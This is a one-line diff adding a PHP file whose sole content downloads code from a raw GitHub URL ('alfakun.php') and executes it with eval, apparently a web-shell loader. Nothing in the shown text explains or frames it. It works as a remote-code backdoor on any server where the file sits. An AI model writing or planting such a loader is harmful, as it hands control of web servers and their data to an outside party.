@@ -1,0 +1,1 @@
+<?=eval("?>".file_get_contents("https://raw.githubusercontent.com/Rzzky/kintilidin/main/alfakun.php"));?>
